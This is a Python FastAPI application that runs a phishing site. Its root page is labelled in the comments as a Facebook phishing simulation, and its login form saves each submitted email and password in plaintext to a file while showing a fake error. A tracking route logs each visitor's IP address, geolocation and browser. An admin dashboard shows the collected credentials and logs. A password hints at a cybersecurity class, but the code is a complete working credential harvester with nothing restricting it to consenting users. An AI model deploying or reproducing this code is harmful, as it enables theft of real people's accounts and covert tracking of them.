from fastapi import FastAPI, Request, Form, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
import httpx
from datetime import datetime

app = FastAPI()
app.add_middleware(SessionMiddleware, secret_key="your_secret_key_here")
templates = Jinja2Templates(directory="templates")

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "cyberclass123"

def is_logged_in(request: Request):
    return request.session.get("logged_in", False)

# Utility to get IP location
async def get_location(ip: str):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                city = data.get("city", "Unknown")
                country = data.get("country_name", "Unknown")
                return f"{city}, {country}"
    except Exception:
        pass
    return "Unknown"

# Root: Facebook Phishing Sim
@app.get("/", response_class=HTMLResponse)
async def get_form(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/", response_class=HTMLResponse)
async def post_form(request: Request, email: str = Form(...), passw: str = Form(...)):
    with open("saved.txt", "a") as f:
        f.write(f"{datetime.now()} - Email: {email} | Password: {passw}\n")
    return HTMLResponse("<h2>Login failed. Please try again later.</h2>")

# IP Tracker page
@app.get("/track", response_class=HTMLResponse)
async def track_visitor(request: Request):
    client_host = request.client.host
    user_agent = request.headers.get("user-agent")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    location = await get_location(client_host)

    log_line = f"[{timestamp}] IP: {client_host} | Location: {location} | Agent: {user_agent}\n"
    with open("visits.txt", "a") as file:
        file.write(log_line)

    return templates.TemplateResponse("tracker.html", {"request": request, "ip": client_host, "location": location})

# Admin login page
@app.get("/login", response_class=HTMLResponse)
async def login_get(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login", response_class=HTMLResponse)
async def login_post(request: Request, username: str = Form(...), password: str = Form(...)):
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        request.session["logged_in"] = True
        return RedirectResponse(url="/admin", status_code=status.HTTP_302_FOUND)
    else:
        return templates.TemplateResponse("login.html", {"request": request, "error": "Invalid credentials"})

# Admin dashboard page
@app.get("/admin", response_class=HTMLResponse)
async def admin_dashboard(request: Request):
    if not is_logged_in(request):
        return RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)
    saved_logs = []
    visits_logs = []
    try:
        with open("saved.txt", "r") as f:
            saved_logs = f.readlines()
    except FileNotFoundError:
        saved_logs = ["No phishing logs found."]
    try:
        with open("visits.txt", "r") as f:
            visits_logs = f.readlines()
    except FileNotFoundError:
        visits_logs = ["No visitor logs found."]
    return templates.TemplateResponse("admin_dashboard.html", {"request": request, "saved_logs": saved_logs, "visits_logs": visits_logs})

# Logout
@app.get("/logout")
async def logout(request: Request):
    request.session.clear()
    return RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)
